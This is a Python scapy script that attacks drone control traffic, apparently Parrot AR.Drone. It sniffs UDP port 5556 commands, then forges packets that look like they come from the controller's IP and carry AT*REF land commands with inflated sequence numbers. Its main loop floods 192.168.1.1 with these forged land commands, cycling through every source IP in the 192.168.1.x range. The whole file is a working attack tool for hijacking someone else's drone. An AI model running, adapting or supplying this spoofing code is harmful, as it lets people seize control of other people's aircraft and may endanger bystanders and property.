#! /usr/bin/env python

# modified from: https://github.com/diogomonica/py-cookieJsInjection/blob/master/OSx10.6_monitorMode.py

import os, time, sys
from subprocess import *
from scapy.all import *
from scapy.layers import *
import threading

SLEEP_TIME = 1 # Number of seconds to sniff (update frequency)

class PacketScanner(threading.Thread):
    def run(self):
        try:
            path="/tmp/"
            dirList=os.listdir(path)
            for fileName in dirList:
                if "airportSniff" in fileName:
                    try:
                        sniff(offline=path+fileName,filter="udp port 5556",prn=parsePacket)
                    except NameError:
                        print "[-] No data found on pcap"
                        pass
                    os.remove(path+fileName)
        except:
            # scapy has bad errors sometimes due to multithreading
            pass # just let thread die

def parsePacket(pkt):
    try:

        if 'UDP' in pkt and pkt.dport == 5556: # read packet meant for drone
            real_ip = pkt.src

            old_seqno = getSeqno(pkt)
            if old_seqno is None or old_seqno < 1:
                return # getseqno failed or errored

            new_seqno = old_seqno + 9999 # accepts any seqno higher than old
            land_cmd = "AT*REF=%d,0\r" % new_seqno # accepts any seqno higher than old
            spoofed_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd

            for i in xrange(25): # send a lot of packets in case they're lost
                send(spoofed_pkt)

    except (AttributeError, Exception) as e:
        print sys.exc_info()[0]
        # pkt could not have attributes we are expecting
        return

def getSeqno(pkt):
    try:
        load = pkt.load
        # command format is AT*[command name]=[seqno][*args]<LF>
        seqno = load[load.find('=') + 1:load.find(',')]
        return int(seqno)
    except (AttributeError, ValueError, Exception) as e:
        # pkt could not have load attribute
        # seqno could not be valid int
        return


def isRoot():
    """Verifies if the current user is root"""
    return os.getuid() & os.getgid() == 0

def printUsage():
    print "Please specify channel as well, i.e. 1"
    print "Usage: %s CHANNEL" % sys.argv[0]

if __name__ == "__main__":
    # if len(sys.argv) < 2:
    #     printUsage()
    #     sys.exit(0)

    # channel = sys.argv[1]

    if not isRoot():
        print "[-] Your have to be root to put airport into monitor mode"
        sys.exit(0)

    # print "[*] Starting scan on channel %s" % channel

    try:
        while(True):
            land_cmd = "AT*REF=%d,0\r" % 9999999 # accepts any seqno higher than old
            for i in xrange(256): # 8 bits in last field
                real_ip = '192.168.1.' + str(i)
                spoofed_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd
                spoofed_pkt.show()
                send(spoofed_pkt)

            ''' sniffer code '''
            # p = Popen("airport " +"sniff " + channel, shell=True)
            # time.sleep(SLEEP_TIME)
            # Popen("kill -HUP %s" % p.pid, shell=True)
            # t = PacketScanner()
            # t.setDaemon(True)
            # t.start()

    except KeyboardInterrupt:
        sys.exit(0)






